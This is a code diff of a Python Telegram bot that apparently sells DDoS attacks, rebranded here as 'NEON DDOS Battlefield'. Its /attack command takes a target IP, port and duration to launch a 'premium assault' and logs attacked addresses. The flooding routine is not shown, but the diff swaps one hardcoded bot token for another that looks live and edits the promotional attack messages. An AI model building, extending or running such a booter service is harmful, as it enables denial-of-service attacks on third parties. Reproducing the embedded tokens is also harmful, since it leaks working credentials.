@@ -5,7 +5,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from telegram.error import TelegramError
 
-TELEGRAM_BOT_TOKEN = '8140157123:AAE407olhaK1kfDUvK3FKJgcDGeY7i27H9I'
+TELEGRAM_BOT_TOKEN = '7938134546:AAF03rH77d8U8I9E2__kSiAyzJDKPjeHuZo'
 ADMIN_USER_ID = 7684537301
 bot_access_free = True
 
@@ -47,10 +47,10 @@ def is_on_cooldown(user_id: int) -> bool:
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "🌟 **Welcome to the Elite Battlefield!** 🌟\n\n"
+        "🌟 **Welcome to the NEON DDOS Battlefield!** 🌟\n\n"
         "Experience our cutting-edge service.\n\n"
         "👉 Use `/attack <ip> <port> <duration>` to initiate your premium assault.\n"
-        "🚀 Let the premium war begin with #NEON_OWNER1 !"
+        "🚀 Let the premium war begin!"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -113,7 +113,7 @@ async def attack(update: Update, context: CallbackContext):
     attacked_ips.add(ip)  # Store attacked IP
 
     await context.bot.send_message(chat_id=chat_id, text=( 
-        f"🔥 **Premium Attack Initiated NOW SEND FEEDBACK TO @NEON_OWNER1!** 🔥\n"
+        f"🔥 **Premium Attack Initiated!** 🔥\n"
         f"**Target:** `{ip}:{port}`\n"
         f"**Duration:** `{duration}` seconds\n\n"
         f"Sit back and enjoy our elite service!"
